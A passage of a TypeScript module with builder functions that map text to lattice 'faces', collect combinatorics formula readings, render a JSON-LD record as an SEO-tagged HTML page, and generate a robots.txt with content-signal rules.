      text: imagine,
      face: seated,
      hop,
      involution: hop === seated,
      experiment: quantumRows[seated]?.name,
      holds: hop === seated,
  },
    holds,
  }
}

/**
 * Reflect a caller's text onto a face and its involution hop, with the stylesheet slots it occupies.
 * @wing presentation
 * @kind builder
 * @evidence reflectHolds
 */
export const reflectOf = (imagine = '') => {
  const text = typeof imagine === 'string' ? imagine : ''
  const css = cssOf(text)
  const faces = facesOf()
  const face = text.length > n - n ? faceOf(text, faces.faces) : n - n
  const hop = (face + faces.rays + faces.rays) % faces.faces
    const seated = css.experiments.find((row) => row.face === face && row.quantum)
  const again = cssOf(text)
  const holds =
    css.holds &&
    hop === face &&
    css.imagine.face === face &&
    css.imagine.hop === hop &&
    again.imagine.face === face &&
    (text.length === n - n || seated?.imagine === true)
  return {
    kind: 'reflect' as const,
    imagine: text,
    face,
    hop,
    involution: hop === face,
    experiment: seated?.name,
    quantum: seated?.quantum === true,
    hz: css.hz,
    css: css.css,
    slots: css.slots,
    experiments: css.experiments,
    genesis: genesisOf(),
    holds,
  }
}

/**
 * One window of the combinatorics family on a UUID's own dimensions.
 * The hex-digit count is mintOf(coins + n). The window length is the lattice face count.
 * A one-argument formula is tried on the window, then on the hex digits.
 * A two-argument formula is tried on (hex digits, window), then (window, window), then (window, hex digits).
 * A row is kept when that existing formula holds and the integer is exact. The window stops at the face count.
 * Subdomain and tld counts are not rows: the zone table does not ask combinatorics for them.
 * @wing presentation
 * @kind builder
 */
export const combinatoricsWindowOf = async (): Promise<{ formula: string; value: number; uuid: string }[]> => {
  const { CombinatoricsFormulas } = await import('../../../families/combinatorics/index.js')
  const hexDigits = mintOf(coins + n)
  const window = facesOf().faces
  const formulas = hexFamiliesOf().get('combinatorics') ?? []
  const call = CombinatoricsFormulas as unknown as Record<string, (...args: number[]) => { value: number; holds: boolean; hex?: string; hexExact: boolean }>
  const rows: { formula: string; value: number; uuid: string }[] = []
  const tuplesOf = (arity: number): number[][] =>
    arity === seed ? [[window], [hexDigits]] : arity === coins ? [[hexDigits, window], [window, window], [window, hexDigits]] : []
  for (const formula of formulas) {
    if (rows.length >= window) break
    const fn = call[formula.name]
    if (typeof fn !== 'function') continue
    for (const params of tuplesOf(formula.arity)) {
      if (rows.length >= window) break
      const row = fn(...params)
      if (row.holds !== true || row.hexExact !== true || typeof row.hex !== 'string' || !Number.isSafeInteger(row.value)) continue
      rows.push({ formula: `combinatorics.${formula.name}(${params.join(',')})`, value: row.value, uuid: row.hex })
    }
  }
  return rows
}

/**
 * A door's JSON-LD reading rendered as one crawlable HTML document: the SEO head a search engine and a social card
 * read (title, meta description, canonical, Open Graph, Twitter, robots), a visible <h1> and lede, the door's own API
 * links for crawl depth, the unit's stylesheet inline, and the full reading embedded as application/ld+json so the
 * structured data travels with the page. A readings window on the document is the first list in Links: formula, integer,
 * and the hex-program UUID, capped at the face count. The unit is API-first JSON-LD; this is the same reading dressed
 * for a browser or a crawler — served fast from the unit itself, so a request for text/html never waits on the HTML frontend.
 * @wing presentation
 * @kind builder
 */
export const qpuPageOf = (doc: Record<string, unknown>, url: string, meta: { title?: string; description?: string } = {}): string => {
  const esc = (s: unknown) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c] ?? c)
  const str = (v: unknown): string => (typeof v === 'string' ? v : '')
  const name = str(doc.name) || unit.host
  const type = str(doc['@type']) || str(doc.kind)
  const title = (meta.title || (type && type !== name ? `${name} — ${type}` : name)).slice(n - n, 70)
  const docs = (doc.docs ?? {}) as { abstract?: unknown; api?: unknown }
  const description = (meta.description || str(docs.abstract) || `${name}: content-addressed JSON-LD and an MCP endpoint.`).slice(n - n, 300)
  const lines = Array.isArray(doc.public) ? doc.public.filter((row): row is string => typeof row === 'string' && row.length > n - n) : []
  const api = Array.isArray(docs.api) ? (docs.api as { path?: string; href?: string; name?: string; reading?: string }[]) : []
  const css = str((doc.css as { css?: unknown } | undefined)?.css)
  const links = api
    .filter((a) => a && (a.href || a.path))
    .map((a) => `<li><a href="${esc(a.href || a.path)}"><code>${esc(a.name || a.path)}</code></a>${a.reading ? ` — ${esc(a.reading)}` : ''}</li>`)
    .join('')
  const graph = ((): { edges: { from: string; to: string; holds: boolean; lead?: true }[]; next?: { uuid: string } } => {
    const raw = doc.links
    if (raw && typeof raw === 'object' && Array.isArray((raw as { edges?: unknown }).edges)) return raw as { edges: { from: string; to: string; holds: boolean; lead?: true }[]; next?: { uuid: string } }
    return qpuCiteOf().links
  })()
  const cited = graph.edges
    .map((edge) => `<li><a href="${esc(edge.from)}">${esc(edge.from)}</a> → <a href="${esc(edge.to)}">${esc(edge.to)}</a> holds ${esc(edge.holds)}${edge.lead ? ' lead' : ''}</li>`)
    .join('')
  const readings = (Array.isArray(doc.readings) ? doc.readings : [])
    .filter((row): row is { formula: string; value: number; uuid: string } => {
      if (!row || typeof row !== 'object') return false
      const reading = row as { formula?: unknown; value?: unknown; uuid?: unknown }
      return typeof reading.formula === 'string' && typeof reading.value === 'number' && Number.isSafeInteger(reading.value) && typeof reading.uuid === 'string'
    })
    .slice(n - n, facesOf().faces)
  const readingList = readings
    .map((row) => `<li><code>${esc(row.formula)}</code> ${esc(row.value)} <a href="${esc(`${unit.origin}/hex/${row.uuid}`)}"><code>${esc(row.uuid)}</code></a></li>`)
    .join('')
  const next = graph.next?.uuid ? `<p>next <a href="${esc(`${unit.origin}/hex/${graph.next.uuid}`)}">${esc(graph.next.uuid)}</a></p>` : ''
  // The page's own animation: the first reading's program, or the next lead — the UUID routing itself to its picture
  // (.svg representation, no prefix). A stable Open Graph image, computed from the address, never drawn by hand.
  const rayUuid = readings[0]?.uuid || graph.next?.uuid || ''
  const rayImage = rayUuid ? `${unit.origin}/${rayUuid}.svg` : ''
  const tag = (p: string, c: string) => `<meta property="${p}" content="${esc(c)}">`
  const meta2 = (nm: string, c: string) => `<meta name="${nm}" content="${esc(c)}">`
  return [
    '<!doctype html>',
    '<html lang="en">',
    '<head>',
    '<meta charset="utf-8">',
    meta2('viewport', 'width=device-width, initial-scale=1'),
    `<title>${esc(title)}</title>`,
    meta2('description', description),
    `<link rel="canonical" href="${esc(url)}">`,
    meta2('robots', 'index,follow,max-image-preview:large,max-snippet:-1'),
    tag('og:type', 'website'),
    tag('og:site_name', unit.host),
    tag('og:title', title),
    tag('og:description', description),
    tag('og:url', url),
    rayImage ? tag('og:image', rayImage) : '',
    rayImage ? tag('og:image:type', 'image/svg+xml') : '',
    meta2('twitter:card', rayImage ? 'summary_large_image' : 'summary'),
    meta2('twitter:title', title),
    meta2('twitter:description', description),
    rayImage ? meta2('twitter:image', rayImage) : '',
    css ? `<style>${css}</style>` : '',
    // escape only the one sequence that could close the script element early; the reading is otherwise verbatim JSON
    `<script type="application/ld+json">${JSON.stringify(doc).replace(/<\//g, '<\\/')}</script>`,
    '</head>',
    '<body class="qpu">',
    '<main>',
    `<h1>${esc(name)}</h1>`,
    lines.length > n - n ? lines.map((row) => `<p>${esc(row)}</p>`).join('\n') : `<p>${esc(description)}</p>`,
    links ? `<nav aria-label="Doors"><h2>Doors</h2><ul>${links}</ul></nav>` : '',
    cited || readingList ? `<nav aria-label="Links"><h2>Links</h2>${readingList ? `<ul>${readingList}</ul>` : ''}${cited ? `<ul>${cited}</ul>` : ''}${next}</nav>` : '',
    `<footer><p>Content-addressed JSON-LD · <a href="/api">MCP</a> · <a href="/openapi.json">OpenAPI</a> · <a href="/sitemap.xml">Sitemap</a></p></footer>`,
    '</main>',
    '</body>',
    '</html>',
  ]
    .filter((row) => row.length > n - n)
    .join('\n')
}

/**
 * robots.txt for one first-party host — the zone's content-signal policy, and the one sitemap that host serves.
 * @wing presentation
 * @kind builder
 * @evidence robotsHolds
 */
export const robotsOf = (host: string = unit.host): string => {
  const h = zoneHostOf(host)
  if (!h) return `User-agent: *\nDisallow: /\n`
  return [
    `# ${h.host} — ${h.serves}`,
    `#`,
    `# AI AGENTS ARE WELCOME. The MCP endpoint for this whole zone is ${unit.origin}/api, described without a`,
    `# round-trip at ${unit.origin}/.well-known/mcp.json and as OpenAPI at ${unit.origin}/openapi.json.`,
    `# Every answer carries its own content address, so a reader can recompute it rather than trust it.`,
    `#`,
    `# Content signals: search and ai-input are granted. ai-train is not — the content is CC BY-NC-ND 4.0`,
    `# (https://${qpuZoneOf().zone}/license), and training a model on it makes a derivative.`,
    ``,
    `User-agent: *`,
    `Content-Signal: search=yes,ai-input=yes,ai-train=no`,
    `Allow: /`,
    ``,
    `Sitemap: ${h.origin}/sitemap.xml`,
    ``,
  ].join('\n')
}

/**
 * SEO zone fields for each host: robots, sitemap and the zone's reserved labels.
 * @wing presentation
 * @kind builder
 * @evidence seoZoneHolds
 */
export const seoZoneOf = onceOf(() => {
  const fields = seoZoneFieldsOf()
  return { ...fields, holds: seoZoneHolds(fields) }
})
